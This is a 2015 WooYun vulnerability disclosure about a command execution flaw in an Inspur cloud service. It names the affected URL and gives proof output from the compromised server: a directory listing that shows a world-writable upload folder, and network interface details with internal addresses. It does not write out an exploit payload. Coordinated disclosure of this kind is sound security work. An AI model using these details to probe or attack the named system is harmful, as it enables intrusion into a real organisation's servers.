wybug_title: 浪潮某业务命令执行漏洞
wybug_detail: 漏洞详情 披露状态：   									2015-06-05：	细节已通知厂商并且等待厂商处理中									2015-06-08：	厂商已经确认，细节仅向厂商公开									2015-06-18：	细节向核心白帽子及相关领域专家公开									2015-06-28：	细节向普通白帽子公开									2015-07-08：	细节向实习白帽子公开									2015-07-23：	细节向公众公开  简要描述： RT 详细说明：  http://cloud.inspur.com/icpserver/uu/inputAccountInfo.do‘   漏洞证明：  -->>ls /usr/share/tomcat/webapps/icpserver/ -ltotal 32-rw-r--r--  1 root   root   1135 Apr  2 09:17 404.html-rw-r--r--  1 root   root      3 Mar 28 13:47 check.html-rw-r--r--  1 root   root    463 Mar 30 15:28 config.properties-rw-r--r--  1 root   root    204 Mar 28 13:47 error.jspdrwxr-xr-x 17 root   root   4096 Mar 30 13:21 icpdrwxr-xr-x  2 root   root   4096 Mar 28 13:47 META-INFdrwxrwxrwx  8 tomcat tomcat 4096 Apr 17 10:58 uploaddrwxr-xr-x  4 root   root   4096 Mar 28 13:47 WEB-INF当前目录：/usr/share/tomcat/webapps/icpserver/结果:>>eth0      Link encap:Ethernet  HWaddr 00:50:56:B3:3C:B9            inet addr:172.30.200.1  Bcast:172.30.200.63  Mask:255.255.255.192          inet6 addr: fe80::250:56ff:feb3:3cb9/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:74449510 errors:0 dropped:0 overruns:0 frame:0          TX packets:76545878 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:7344076633 (6.8 GiB)  TX bytes:26279058826 (24.4 GiB)lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:42074 errors:0 dropped:0 overruns:0 frame:0          TX packets:42074 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:85324622 (81.3 MiB)  TX bytes:85324622 (81.3 MiB)------------------------------------------------------------------------------------------   修复方案：     版权声明：转载请注明来源 M4sk@乌云
